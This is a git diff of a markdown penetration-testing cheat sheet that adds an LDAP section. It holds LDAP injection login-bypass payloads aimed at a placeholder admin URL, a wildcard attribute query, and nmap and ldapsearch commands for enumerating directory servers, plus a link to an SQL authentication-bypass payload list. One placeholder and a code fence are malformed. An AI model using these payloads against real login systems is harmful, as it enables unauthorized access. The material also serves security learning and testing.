@@ -445,12 +445,30 @@ https://xcat.readthedocs.io/en/latest/
 
 https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/exploit/Auth_Bypass.txt
 
-## LDAP Injection
+## LDAP query and LDAP Injection
+
+### LDAP Injection - Bypass Login
+
+```$filter = "(&(uid=$username)(userPassword=$password))";```
+
+`https://site.com/admin.php?username=*&password=*`  
+or
+`https://site.com/admin.php?username=admin)(userPassword=*))%00&password=blabla`
+
+-> Others
 
 `https://site.com/item?objectClass=*`
-
 `(&(sn=administrator)(password=*))`
-  
+
+### LDAP Query
+`nmap -p 389,636 --script ldap-* 192.168.191.132`  
+or
+`ldapsearch -x -H ldap://ip -D "cn=<cn,dc=<dc>,dc=<dc>" -w <password>  -s base namingcontexts`  
+`ldapsearch -x -H ldap://ip -D "cn=<cn>,dc=<dc>,dc=<dc>" -w <password>  -b "dc=<dc>,dc=<dc>`
+
+```
+https://github.com/dinigalab/ldapsearch
+
 ### Docs
   
 https://tldp.org/HOWTO/archived/LDAP-Implementation-HOWTO/schemas.html  
